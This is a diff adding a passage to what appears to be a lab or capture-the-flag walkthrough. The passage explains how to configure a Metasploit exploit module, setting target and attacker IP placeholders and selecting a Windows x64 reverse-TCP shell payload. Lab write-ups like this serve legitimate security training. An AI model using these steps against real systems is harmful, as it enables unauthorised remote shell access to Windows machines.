@@ -73,6 +73,21 @@ In this instance we can use the first result, to load this module type ```use 0`
 
 This will also now provide us with the answer to our first question in this section: **Find the exploitation code we will run against the machine. What is the full path of the code?**  
 
+Now that we have loaded this module we will need to configure a couple of items. Firstly lets view our options via ```show options```  
+![Gain Access - Initial options](./Images/Gain%20Access%20-%20Initial%20options.png)  
+The items we will need to change are **RHOSTS**, **LHOST** and the **Payload**  
+
+Do this via the following commands
+```set RHOSTS TARGET_IP```
+```set LHOST YOUR_MACHINE_IP```
+```set payload windows/x64/shell/reverse_tcp```
+
+Now we can view our options again via ```show options``` and confirm our remote and local host IP's are correct and that our payload has been adjusted as required.  
+![Gain Access - options final](./Images/Gain%20Access%20-%20options%20final.png)
+
+
+
+
 ---
 
 ## 🛠️ Escalate: 
